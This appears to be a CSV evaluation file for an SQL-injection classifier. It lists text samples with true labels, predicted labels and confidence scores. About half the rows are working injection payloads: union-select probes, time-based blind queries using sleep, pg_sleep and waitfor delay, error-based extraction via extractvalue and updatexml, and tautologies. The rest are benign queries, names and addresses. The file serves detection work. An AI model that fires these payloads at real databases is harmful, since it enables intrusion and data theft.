text,true_label,predicted_label,confidence_sql_injection
"1  )   where 9469  =  9469 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
select count ( everyone ) from color,0,0,0.0
10110,0,0,0.004468253314358248
"   select strike, last, teethfrom vegetable where parent  is not null",0,0,0.0
"1%' union all select null,null,null,null,null,null,null,null--",1,1,1.0
coca artero,0,0,0.004468253314358248
enjabonadura,0,0,0.004468253314358248
1' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1,1.0
"1%""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""%""  =  """,1,1,1.0
alfeo,0,0,0.004468253314358248
select gasoline,0,0,0.03250505488953901
%27 or 1  =  1,1,1,1.0
select fur ( s ) from classroom inner join,0,0,0.0
"1' in boolean mode  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
dolores ibarruri 75,0,0,0.0012045813123877282
select option_value from wp_options where option_name  =  '_site_transient_timeout_wp_wps_bg_image_sync_1_process_lock' limit 1,0,0,0.0
-5774' where 3632  =  3632 or   (  3177  =  4222  )  *4222--,1,1,1.0
select * from development order by load desc,0,0,0.0
50159319e,0,0,0.004468253314358248
bruscamente,0,0,0.004468253314358248
"1'+  (  select wjpc where 5943  =  5943 and make_set  (  8403  =  8403,8899   )    )   +'",1,1,1.0
"1%""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1.0
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,1,1.0
"-4418"" or 6872  =  6872 and ""gbut""  =  ""gbut",1,1,0.98
select * from roof fetch first 3 rows only select top 50 percent * from apart,0,0,0.0
"insert into highest ( opinion, heavy, paragraph, party, ball, chance )  values  ( 'feed', 'inside'. process', 'rough', 'got', 'power', 'base' )  ",0,0,0.01
"-7544""   )    )    union all select 3808,3808,3808,3808--",1,1,1.0
palazuelos de eresma,0,0,0.0
"1""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""prtf"" like ""prtf",1,1,1.0
"1' and make_set  (  9860  =  6956,6956  )   and 'toru'  =  'toru",1,1,1.0
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",1,1,1.0
select pg_sleep  (  5  )   and 'rpka'  =  'rpka,1,1,0.99
select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,1,1,0.98
gatliff.charlton@eco-pro.jm,0,0,0.006527024015406931
"1""   )    )     )   union all select null,null,null,null,null,null#",1,1,1.0
grimm@madrid2012.nu,0,0,0.004468253314358248
kumushalieva@hiperbarcelona.ly,0,0,0.004468253314358248
 and 1  =  utl_inaddr.get_host_address   (    (   select count  (  distinct  (  table_name   )    )    from sys.all_tables   )    )    and 'i'  =  'i,1,1,1.0
select * from take where country not between 'deer' and 'military',0,0,0.0
-5918'  )   as olzc where 5992  =  5992 or 4390  =  9085,1,1,1.0
"1' in boolean mode  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  #",1,1,1.0
"   select them, control+ ', ' + slabs+ ' ' + upward+ ', ' + chosen as name  from everything",0,0,0.05
" select position ( ""a"" in customername )  from customers;",0,0,0.0
"-2373%""  )   or 9323  =  9323#",1,1,1.0
5.62626e+14,0,0,0.0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'nhuk'  =  'nhuk",1,1,1.0
pelland,0,0,0.004468253314358248
select * from football,0,0,0.0
sabiela,0,0,0.004468253314358248
select top 3 * from practice,0,0,0.0
"  update everywhere set volume =  'moment', city =  'place' where several =  labor",0,0,0.0
"   select point, man, pinkfrom jungle where canal  is not null",0,0,0.0
"  select round ( 135.375, 2 ) ;",0,0,0.0
"-9861' union all select 5710,5710,5710,5710,5710--",1,1,1.0
select avg ( fastened ) from fighting select sum ( hay ) ,0,0,0.0
select * from smoke where silly = 'serve',0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 179 )  order by meta_id asc",0,0,0.0
"-1597"" where 5933  =  5933 or 3038  =  3038",1,1,1.0
-2912'   )    )    order by 1--,1,1,1.0
cortegana,0,0,0.004468253314358248
bujaraloz,0,0,0.004468253314358248
select * from cannot fetch first 50 percent rows onlyselect top 3 * from itself,0,0,0.0
select top 3 * from printed select * from watch 3select * from believed,0,0,0.0
rowen,0,0,0.004468253314358248
3953,0,0,0.004468253314358248
"-2872  )   where 8797  =  8797 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,1.0
select * from lower 3,0,0,0.0
rorke,0,0,0.004468253314358248
marcano giner,0,0,0.004468253314358248
select avg ( stream ) from reader select sum ( drink ) ,0,0,0.0
select * from business where price not between 10 and 20,0,0,0.0
"  select insert ( ""w3schools.com"", 1, 9, ""example"" ) ;",0,0,0.18
24n1e39,0,0,0.004468253314358248
"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",1,1,1.0
select * from stuck where think = 'solid'  and city = 'tears',0,0,0.0
select * from brain where activity not like 'bush%',0,0,0.0
select top 3 * from nearer select * from visitor 3select * from purple,0,0,0.0
select * from yet where point not like 'breeze%',0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 28080 )  order by meta_id asc",0,0,0.0
select fewer ( s )  from life select throughout from ear,0,0,0.0
elysha,0,0,0.004468253314358248
5.67192e+14,0,0,0.0
select press from bear union all select finger from one order by central,0,0,0.0
teo,0,0,0.004468253314358248
" select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",1,1,1.0
44394,0,0,0.004468253314358248
rapetto picabea,0,0,0.004468253314358248
terrassa,0,0,0.004468253314358248
"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'iaud'  =  'iaud",1,1,1.0
"1%""  )   union all select null,null,null,null--",1,1,1.0
select * from silence 3 select * from dozen,0,0,0.0
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1,1,1.0
"  select leaf,did from leave where creature = 'whole' union select nor, before from written",0,0,0.0
"1   )    )    as cdhd where 2958  =  2958 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1.0
"select customername, contactname, city from customers where country  =  'brazil'; drop view view_name ; drop view [brazil customers];",0,0,0.02
"   select cap, meal, hungry from captured where pony  is null",0,0,0.0
select diagram ( s from actual right join,0,0,0.0
select * from bend fetch first 50 percent rows only,0,0,0.0
select universe ( s )  from relationship left join,0,0,0.0
1 waitfor delay '0:0:5'-- nnnp,1,1,1.0
select * from fell where potatoes like '%screen%',0,0,0.0
"-1368   )    )    union all select 1310,1310,1310,1310,1310#",1,1,1.0
"insert into steady  ( kitchen, far, source )  values  ( 'bear', 'ride', 'provide' )  ",0,0,0.0
"1"" where 5927  =  5927",1,1,1.0
1'  )   as mzby where 6530  =  6530,1,1,1.0
"-1510'   )    )     )   union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",1,1,1.0
select * from accurate where camp between '1996-07-01' and '1996-07-31',0,0,0.0
1  )   as afmb where 8665  =  8665 order by 1#,1,1,0.99
1'+  (  select enzd where 6046  =  6046 and   (  3020  =  3020  )  *6703  )  +',1,1,0.98
select * from line where map = 'connected' fetch first 3 rows only,0,0,0.0
1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,1,1.0
"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'nopu'  =  'nopu",1,1,1.0
trastabilln,0,0,0.004468253314358248
borrachero muros,0,0,0.004468253314358248
" select * from turn order by offer, hat",0,0,0.0
"1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'zglq'  =  'zglq",1,1,1.0
"1%""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""%""  =  """,1,1,1.0
villaturiel,0,0,0.004468253314358248
select * from depth where mountain = 'women' fetch first 3 rows only,0,0,0.0
select avoid ( s )  from room left join,0,0,0.0
ganoza,0,0,0.004468253314358248
select max (  column_name  )  from table_name where condition ;,0,0,0.0
maiga,0,0,0.004468253314358248
select avg ( describe ) from cat,0,0,0.0
select avg ( bone ) from bare select sum ( happily ) ,0,0,0.0
select baseball ( s )  from limited select safe ( s ) ,0,0,0.0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""pdqm"" like ""pdqm",1,1,1.0
"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",1,1,1.0
"1%""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,1,1.0
select these ( s )  from within union,0,0,0.0
select * from tea where captain not between 'just' and 'park',0,0,0.0
select * from cow where root = 'every' limit 3,0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 416 )  order by meta_id asc",0,0,0.0
"   select enemy, pay+ ', ' + process+ ' ' + myself+ ', ' + hold as value  from stick",0,0,0.0
"1'  )   as ohcs where 9588  =  9588 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,1,1.0
"1%""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""%""  =  """,1,1,1.0
update `wp_options` set `option_value`  =  '0' where `option_name`  =  'medium_large_size_h',0,0,0.0725
 update thread set tool = 'surprise'where fighting = 'clothes',0,0,0.0
"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'ccqs'  =  'ccqs",1,1,1.0
select count ( distinct hardly )  from rabbit,0,0,0.0
1'+  (  select gkve where 1943  =  1943 waitfor delay '0:0:5'  )  +',1,1,0.98
"1  )   as kzyb where 7023  =  7023 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
select avg ( army ) from build select sum ( running ) ,0,0,0.0
"1   )    )    as krzi where 8727  =  8727 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
select top 50 percent * from popular,0,0,0.0
"-2920""   )    )    as zdgv where 9702  =  9702 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1,1.0
"   select composition, mostly+ ', ' + eaten+ ' ' + task+ ', ' + village as lose  from wall",0,0,0.0
" select * from express order by independent asc, love desc",0,0,0.0
from  ( select distinct sale from search ) ,0,0,0.0
" select * from usually order by game, nest",0,0,0.0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'vwxg'  =  'vwxg",1,1,1.0
budd9,0,0,0.004468253314358248
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""vqpx"" like ""vqpx",1,1,1.0
"1%' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and '%'  =  '",1,1,1.0
select distinct plan from widely,0,0,0.0
if  (  9770  =  9748  )   select 9770 else drop function zyuo--,1,1,1.0
"-6334'  )   union all select 3738,3738,3738,3738,3738,3738,3738,3738--",1,1,1.0
"1'  )   as fyuh where 7608  =  7608 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1,1.0
"1   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   4686  =  4686",1,1,1.0
select * from church fetch first 50 percent rows only,0,0,0.0
peaflor,0,0,0.004468253314358248
pensosa,0,0,0.004468253314358248
select * from flame where men between since09/01/1996minute and teeth15/31/1996rocky,0,0,0.0
select count ( * )  as sail,0,0,0.0
"-2211"" or 2113  =  8885#",1,1,1.0
select * from son where leaf = 'open',0,0,0.0
select * from prepare where began not like 'flew%',0,0,0.0
dick,0,0,0.004468253314358248
"1""   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""nobt""  =  ""nobt",1,1,1.0
81568460h,0,0,0.004468253314358248
"c/ honduras, 139 7-a",0,0,0.0
"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",1,1,1.0
"select wp_posts.id from wp_posts where 1 = 1 and wp_posts.post_type  =  'acf-field' and   (  (  wp_posts.post_status  =  'publish'  )  )   and wp_posts.post_name  =  'field_5fc54784b64dd' order by wp_posts.menu_order asc, wp_posts.post_title asc limit 0, 1",0,0,0.0
16417,0,0,0.004468253314358248
select nation from anywhere union all select difficulty from easy order by common,0,0,0.0
"1%""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""%""  =  """,1,1,1.0
tremewan,0,0,0.004468253314358248
"1"" where 8672  =  8672 union all select null,null#",1,1,1.0
azorin 35 1b,0,0,0.004468253314358248
select * from magnet where four like '%fat%',0,0,0.0
select * from bare where tomorrow between bent09/01/1996improve and clock15/31/1996musical,0,0,0.0
select top 50 percent * from surprise select * from bare fetch first 50 percent rows onlyselect top 3 * from deal,0,0,0.0
29716,0,0,0.004468253314358248
77711232m,0,0,0.004468253314358248
terraje,0,0,0.004468253314358248
"1'  )   as vlwh where 9403  =  9403 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1,1.0
"insert into shelter  ( third, disease, dance )  values  ( 'cause', 'wrote', 'eight' )  ",0,0,0.0
select count ( those ) from provide,0,0,0.0
1 and sleep  (  5  )  -- ruuv,1,1,1.0
"insert into list  ( aid, pot, interior )  values  ( 'blood', 'surface', 'surrounded' )  ",0,0,0.0
1'  )   as svtm where 7627  =  7627 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1,1,0.99
"1%""   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1,1.0
select plane from require,0,0,0.0
"  select addtime ( ""09:34:21.000001"", ""2:10:5.000003"" ) ;",0,0,0.03
//*,1,1,0.7394146601828376
select * from article where lunch = 'upper',0,0,0.0
1'||  (  select 'glyc' from dual where 4058  =  4058,1,1,1.0
select min ( symbol )  as while from hurried,0,0,0.0
"   select hunt,women,orange,bottom,where     (  (  depth join atmosphere on describe.correctly =  actually.copper )   inner join fasteron orders.eight =  ocean.loseid ) ",0,0,0.01
select * from sky where bar in  ( select asleep from balloon ) ,0,0,0.0
1%'   )    )     )   and 2006  =  2006,1,1,0.9900451374640952
"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'pbtf'  =  'pbtf",1,1,1.0
